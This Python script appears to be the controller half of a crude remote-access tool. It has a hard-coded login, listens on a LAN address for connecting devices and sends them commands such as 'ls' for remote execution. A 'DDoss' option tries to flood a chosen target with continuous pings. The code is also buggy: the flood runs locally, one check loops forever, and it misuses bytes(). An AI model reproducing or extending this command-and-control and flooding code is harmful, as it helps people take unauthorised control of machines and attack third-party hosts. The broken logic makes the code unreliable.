import os
import sys
import datetime
import time

print("     _   _      _ _       _ _ ")
print("    | | | | ___| | | ___ | | |")
print("    | |_| |/ _ \ | |/ _ \| | |")
print("    |  _  |  __/ | | (_) |_|_|")
print("    |_| |_|\___|_|_|\___/(_|_)")
print("\n      remote control V[1.0] \n         powerd by DDa52 \n \n")


commands = "[*]listen   to listen on ports to find dvices"


def main():
    username = input("[*]Enter username please >>> ")
    time.sleep(1)
    if username == "anony_029":
        password = input("[*]Enter password please >>> ")
        time.sleep(1)
        if password == "mypassroot":
            print("\n[*]Wilcome!sir\n")
            while True:
                time.sleep(1)

                def listen():
                    time.sleep(1)
                    import socket

                    s= socket.socket()
                    host = "192.168.1.3"
                    time.sleep
                    port_str = input("\n[*]Enter Port to start scan >>> ")
                    dvice_num_str = input("\n[*]Enter dvice Number >>> " )
                    dvice_num_int = int(dvice_num_str)
                    while dvice_num_int < 1:
                        print(str("[*]must be more than zero dvice..."))
                    port_int = int(port_str)
                    s.bind((host,port_int))
                    s.listen(dvice_num_int)
                    print("[*]start listen... to port: "+port_str+" & host: "+host)
                    conn, addr = s.accept()
                    print("<=== start Remot Connect to V[1.0] ===>\n")
                    command = input(str("[*]Enter command (Remote Connect V[1.0])>>> "))

                    
                    if command == "ls":
                        conn.send(command.encode())
                        print ("")
                        print ("Done.. Waiting For Execution...")
                        print ("")
                        files = conn.recv(4000)
                        files = files.decode()
                        print ("Done.. Output >> ",files)
                    elif command == "DDoss":
                        target = input("Enter target link >>> ")
                        conn.send(bytes(os.system("start ping -t"+target)))
                        replay = conn.recv(5000)
                        print("[*]replay: "+replay)
                    else:
                        time.sleep(1)
                        print ("")
                        print ("[*]command not found... ")
                listen()
        else:
            print("Fuck you!!!!")
            sys.exit()
        
    else:
        print("Fuck you!!!!")
        sys.exit()

main()
    
